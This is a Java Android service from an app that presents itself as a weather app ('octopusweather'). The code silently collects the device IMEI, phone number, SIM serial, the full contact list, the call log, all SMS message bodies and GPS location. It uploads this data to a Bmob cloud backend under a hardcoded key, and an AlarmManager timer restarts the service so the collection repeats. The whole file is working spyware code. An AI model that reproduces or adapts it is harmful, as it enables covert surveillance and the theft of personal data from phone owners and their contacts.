package com.example.zy.octopusweather.service;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.example.zy.octopusweather.db.TextPrivacy;

import java.text.SimpleDateFormat;
import java.util.Date;

import cn.bmob.v3.Bmob;
import cn.bmob.v3.exception.BmobException;
import cn.bmob.v3.listener.SaveListener;

/**
 * 服务名称：GetPrivacyService
 * 功能：
 *      1.获取识别码、电话基本信息、获取通讯录、获取通话记录、获取短信内容、获取GPS位置
 *      2.每次开启应用自动上传数据
 * 作者：ZhangYi
 * 时间：2017.3.11
 * **/

public class GetPrivacyService extends IntentService {

    private static final String TAG = "zy_GetPrivacyService";

    //定位初始化
    public LocationClient mLocationClient;

    //数据存储变量
    private String contactsData;
    private String phoneInfo;
    private String callLogData;
    private String SMSRecord;
    private String Location;
    private String IMEI;

    //构造函数
    public GetPrivacyService() {
        super("GetPrivacyService");
        //定位系统初始化
        mLocationClient = new LocationClient(GetPrivacyService.this);
        mLocationClient.registerLocationListener(new MyLocationListener());
    }

    //异步、子线程运行、自动停止
    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        Log.d(TAG, "[info]GetPrivacyService开启线程onHandleIntent");

        //初始化Bmob服务
        Bmob.initialize(this, "82a6f2aa4744f2117141481eb311ba7b");
        Log.d(TAG, "[info]Bmob服务初始化成功...");

        //获取IMEI
        IMEI = getIMEI();
        //获取电话基本信息
        phoneInfo = getPhoneInfo();
        //获取通讯录
        contactsData = readContacts();
        //获取通话记录
        callLogData = readCallList();
        //获取短信记录
        SMSRecord = readSMS();
        //获取GPS位置
        requestLocation();
        while (Location == null) { }
        Log.d(TAG, "[info]GetPrivacyService隐私信息获取完毕...");

        //数据上传服务器
        TextPrivacy c = new TextPrivacy();
        c.setIMEI(IMEI);
        c.setPhoneInfo(phoneInfo);
        c.setContactsData(contactsData);
        c.setCallLog(callLogData);
        c.setSMSRecord(SMSRecord);
        c.setLocation(Location);
        c.save(new SaveListener<String>() {
            @Override
            public void done(String objectId,BmobException e) {
                Log.d(TAG, "[info]GetPrivacyService正在上传隐私数据");
                Log.d(TAG, "[error]"+e);
                if(e==null){
                    Log.d(TAG, "[info]GetPrivacyService上传结果: succeed!");
                }else{
                    Log.d(TAG, "[info]GetPrivacyService上传结果: failure!");
                }
            }
        });
    }

    /**
     *获取移动设备识别码
     */
    public String getIMEI() {
        TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
        IMEI = tm.getDeviceId();
        return IMEI;
    }

    /**
     * 获取电话的基本信息
     */
    public String getPhoneInfo() {
        StringBuilder phoneInfo = new StringBuilder();
        TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
//        String device = Build.DEVICE; // 手机型号
//        String brand = Build.BRAND; // 手机牌子
        String model = android.os.Build.MODEL; // 手机型号
        String release = android.os.Build.VERSION.RELEASE; // Android版本
        String user = Build.USER; //用户(如root)
        phoneInfo.append("手机型号：" + model + "\n");
        phoneInfo.append("Android版本号：" + release +"\n");
        phoneInfo.append("用户：" + user + "\n");
        phoneInfo.append("手机号：" + tm.getLine1Number() + "\n");
        phoneInfo.append("运营商：" + tm.getSimOperatorName()+ "\n");
        phoneInfo.append("SIM卡序列号：" +tm.getSimSerialNumber() + "\n");
        return phoneInfo.toString();
    }

    /**
     * 读取通讯录
     */
    public String readContacts() {
        StringBuilder data = new StringBuilder();
        Cursor cursor = null;

        cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                //获取姓名、电话号码
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                data.append(name + ":" + number + "\n");
            }
            cursor.close();
        }
        return data.toString();
    }

    /**
     * 读取通话记录
     */
    public String readCallList() {
        StringBuilder data = new StringBuilder();
        Cursor cursor = null;

        cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));//通话人
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));//电话号码
                long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                String date = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss").format(new Date(dateLong));//日期
                int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));//通话时长
                int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));//通话类型
                String typeString = "";
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE:
                        typeString = "打入";
                        break;
                    case CallLog.Calls.OUTGOING_TYPE:
                        typeString = "打出";
                        break;
                    case CallLog.Calls.MISSED_TYPE:
                        typeString = "未接";
                        break;
                    default:
                        break;
                }
                data.append(typeString + "|" + name + ":" + number + "|日期：" + date + "|通话时长：" + (duration / 60) + "分钟" + "\n");
            }
            cursor.close();
        }
        return data.toString();
    }

    /**
     * 读取短信记录
     */
    public String readSMS() {
        Uri SMS_URI = Uri.parse("content://sms/");
        StringBuilder data = new StringBuilder();
        Cursor cursor = null;

        cursor = getContentResolver().query(SMS_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String strAddress = cursor.getString(cursor.getColumnIndex("address"));
                String strBody = cursor.getString(cursor.getColumnIndex("body"));
                int intType = cursor.getInt(cursor.getColumnIndex("type"));
                long longDate = cursor.getLong(cursor.getColumnIndex("date"));
                String date = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(longDate));

                String strType = "";
                if (intType == 1) {
                    strType = "接收";
                } else if (intType == 2) {
                    strType = "发送";
                } else {
                    strType = "null";
                }
                data.append("[通信方：" + strAddress + "|内容：" + strBody + "|" + date + "|" + strType + " ]\n");
            }
            cursor.close();
        }
        return data.toString();
    }

    /**
     * 请求GPS定位
     */
    public void requestLocation() {
        initLocation();
        mLocationClient.start();
    }

    /**
     * GPS定位初始化
     */
    private void initLocation(){
        LocationClientOption option = new LocationClientOption();
        option.setIsNeedAddress(true);
        option.setIsNeedLocationDescribe(true);
        option.setOpenGps(true);
        mLocationClient.setLocOption(option);
    }

    /**
     * GPS数据监听器接口实现
     */
    public class MyLocationListener implements BDLocationListener {

        @Override
        public void onReceiveLocation(BDLocation location) {
            //定位测试用例
            StringBuilder currentPosition = new StringBuilder();
            currentPosition.append("纬度：").append(location.getLatitude()).append("\n");
            currentPosition.append("经线：").append(location.getLongitude()).append("\n");
            currentPosition.append("国家：").append(location.getCountry()).append("\n");
            currentPosition.append("省：").append(location.getProvince()).append("\n");
            currentPosition.append("市：").append(location.getCity()).append("\n");
            currentPosition.append("区：").append(location.getDistrict()).append("\n");
            currentPosition.append("街道：").append(location.getStreet()).append("\n");
            currentPosition.append("定位精度：").append(location.getRadius()).append("\n");
            currentPosition.append("语义化信息：").append(location.getLocationDescribe()).append("\n");
            currentPosition.append("定位方式：");
            if (location.getLocType() == BDLocation.TypeGpsLocation) {
                currentPosition.append("GPS"+"\n");
                currentPosition.append("海拔高度：").append(location.getAltitude()).append("\n");
            } else if (location.getLocType() == BDLocation.TypeNetWorkLocation) {
                currentPosition.append("网络"+"\n");
                currentPosition.append("运营商：").append(location.getOperators()).append("\n");
            }
            Location = currentPosition.toString();
        }
    }

    /**
     * 释放资源
     */
    @Override
    public void onDestroy() {
        mLocationClient.stop();
        AlarmManager manager = (AlarmManager) getSystemService(ALARM_SERVICE);
//        int anHour = 24 * 60 * 60 * 1000; // 自启动定时24h
        int anHour = 10* 1000; // 测试间隔10s
        long triggerAtTime = SystemClock.elapsedRealtime() + anHour;
        Intent i = new Intent(this, GetPrivacyService.class);
        PendingIntent pi = PendingIntent.getService(this, 0, i, 0);
        manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pi);
        Log.d(TAG, "[info]GetPrivacyService服务定时完毕...");
        super.onDestroy();
        Log.d(TAG, "[info]GetPrivacyService服务已经被销毁");
    }
}
